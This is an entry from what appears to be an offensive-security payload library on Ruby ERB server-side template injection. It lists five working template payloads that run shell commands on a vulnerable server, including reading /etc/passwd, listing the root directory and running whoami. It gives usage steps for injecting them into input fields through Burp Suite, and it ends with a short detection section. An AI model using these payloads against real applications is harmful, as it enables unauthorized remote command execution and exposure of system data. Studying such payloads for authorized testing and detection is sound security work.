---
id: d7d5c66a-a7f3-4de1-ad42-e365e472935a
type: code
language: Ruby
verified: true
created_at: '2023-04-06T03:56:40.226082+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - SSTI
  - RCE
  - Ruby
  - ERB
validated: true
---

# Ruby-ERB-SSTI-Command-Execution-and-File-Read

## Code

```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

## Description

This Ruby code snippet exploits Server-Side Template Injection (SSTI) using the ERB template engine to execute arbitrary system commands on a vulnerable web server. It reads the /etc/passwd file to enumerate users, lists the root directory contents, and identifies the current user running the web process via whoami. The code uses ERB tags (<%= %> for output, <% %> for execution) combined with Ruby's system execution methods to inject and run shell commands server-side.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | This payload uses hardcoded commands; customize commands like 'cat /etc/passwd' or 'whoami' based on target objectives. No runtime variables required. | N/A |

## Usage

Inject this payload into a user-controlled input field that is rendered by an ERB template in a Ruby web application (e.g., via a search parameter or profile field). Use a proxy like Burp Suite to modify requests and observe the response for embedded command outputs. This is typically used in web penetration testing after confirming SSTI via simple math payloads like '<%= 7*7 %>'. Once executed, it provides initial reconnaissance data for further exploitation.

## Detection

- Monitor web application logs for template rendering errors or unusual Ruby code execution (e.g., via Rails logs showing ERB evaluation).
- WAF rules detecting ERB tags like '<%=', '<%', or keywords such as 'system', 'popen', 'require' in inputs.
- Server-side process monitoring for anomalous command executions (e.g., 'cat /etc/passwd' or 'whoami') via tools like auditd or Sysmon.
- Network response analysis for unexpected content like file listings or user enumerations in HTTP bodies.

## Related

- [[procedures/Ruby-Server-Side-Template-Injection-for-Code-Execution]]
